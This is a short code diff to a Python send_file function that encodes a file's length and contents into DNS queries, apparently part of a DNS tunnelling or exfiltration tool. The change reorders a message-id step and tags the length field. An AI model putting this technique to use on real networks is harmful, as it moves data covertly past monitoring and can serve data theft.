@@ -115,12 +115,13 @@ def send_file(path: str):
         print("[!] File not found.")
         return
 
+    msg_id = file_message_id(file_data)
+
     # Send file length first
-    length_domains = prepare_dns_payload(str(len(file_data)).encode())
-    send_dns_queries(length_domains, dns.rdatatype.A)
+    length_domains = prepare_dns_payload(f"I:{len(file_data)}".encode())
+    send_dns_queries(length_domains, dns.rdatatype.A, msg_id)
 
     # Send file content
-    msg_id = file_message_id(file_data)
     data_domains = prepare_dns_payload(file_data)
     responses = send_dns_queries(data_domains, dns.rdatatype.A, msg_id)
 
